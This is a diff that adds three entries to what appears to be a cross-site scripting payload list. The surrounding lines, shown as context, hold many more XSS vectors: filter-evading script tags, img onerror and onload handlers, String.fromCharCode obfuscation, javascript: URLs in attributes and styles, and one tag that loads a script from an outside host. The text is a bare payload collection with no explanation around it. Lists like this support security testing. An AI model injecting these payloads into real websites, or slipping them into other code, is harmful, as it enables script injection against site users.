@@ -181,6 +181,7 @@ http://www.<script>alert(1)</script .com
 <script itworksinallbrowsers>/*<script* */alert(1)</script
 
 <img src ?itworksonchrome?\/onerror = alert(1)
+<img/src=`` onerror=this.onerror=confirm(1)
 
 <svg><script>//&NewLine;confirm(1);</script </svg>
 <svg><script onlypossibleinopera:-)> alert(1)
@@ -211,6 +212,7 @@ http://www.<script>alert(1)</script .com
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 ‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <IMG “””><SCRIPT>alert(“XSS”)</SCRIPT>”>
+<IMG SRC=x onload="alert(String.fromCharCode(88,83,83))">
 <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
 <IMG SRC=”jav ascript:alert(‘XSS’);”>
 <IMG SRC=”jav&#x09;ascript:alert(‘XSS’);”>
@@ -452,6 +454,7 @@ perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
 '';!--\"&lt;XSS&gt;=&{()}
 ';alert(String&#46;fromCharCode(88,83,83))//\';alert(String&#46;fromCharCode(88,83,83))//\";alert(String&#46;fromCharCode(88,83,83))//\\";alert(String&#46;fromCharCode(88,83,83))//--&gt;&lt;/SCRIPT&gt;\"&gt;'&gt;&lt;SCRIPT&gt;alert(String&#46;fromCharCode(88,83,83))&lt;/SCRIPT&gt;
 ';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
 '';!--"<XSS>=&{()}
 <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
